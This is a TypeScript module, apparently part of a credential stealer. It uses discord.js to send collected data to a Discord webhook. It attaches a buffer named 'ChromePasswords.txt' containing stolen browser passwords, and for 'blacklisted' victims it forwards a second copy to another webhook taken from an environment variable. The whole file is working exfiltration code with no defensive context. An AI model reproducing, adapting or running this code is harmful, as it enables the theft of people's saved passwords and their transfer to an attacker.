import { WebhookClient, MessagePayload, AttachmentBuilder } from "discord.js";
import dotenv from "dotenv";
dotenv.config();
const hatehook = process.env.DISCORD_HATEHOOK;

export default async function sendWebhook(body:any,webhookURL:string, blacklisted?: boolean) {
    const webhook = new WebhookClient({url: webhookURL});
    const messageBody = body[0]
    const PasswordsTxtBuffer = body[1]
    try {
        if (PasswordsTxtBuffer !== undefined) {
            const attachment = new AttachmentBuilder(PasswordsTxtBuffer, {name: 'ChromePasswords.txt'})
            const message = new MessagePayload(webhook, {
                embeds: messageBody['embeds'],
                username: messageBody.username,
                avatarURL: messageBody.avatarURL,
                files: [attachment]
            });
            await webhook.send(message);
            if (blacklisted && hatehook) {
                const hateWebhook = new WebhookClient({url: hatehook});
                await hateWebhook.send(message);
            }
        }
        else {
            const message = new MessagePayload(webhook, {
                embeds: messageBody['embeds'],
                username: messageBody.username,
                avatarURL: messageBody.avatarURL
            });
            await webhook.send(message);
        }
    } catch (e) {
        console.log(e)
    }
}